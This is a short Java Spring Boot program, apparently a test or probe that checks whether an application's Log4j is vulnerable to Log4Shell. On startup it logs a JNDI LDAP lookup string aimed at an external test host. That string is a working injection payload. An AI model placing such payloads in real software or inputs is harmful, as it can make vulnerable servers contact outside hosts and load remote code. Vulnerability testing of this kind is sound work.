package com.example.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.ApplicationRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;

/**
 * @author Greg Baker (gregory.j.baker@hrsdc-rhdcc.gc.ca)
 * @since 0.0.0
 */
@SpringBootApplication
public class Application {

	private static final Logger log = LogManager.getLogger(Application.class);

	public static void main(String[] args) {
		SpringApplication.run(Application.class, args);
	}

	@Bean ApplicationRunner applicationRunner() {
		final var id = "77136afc-275d-4695-b872-fcc8ab676bdd";
		return args -> log.info("${jndi:ldap://log4jshell-test.youth-digital-gateway.ca:3890/{}}", id);
	}

}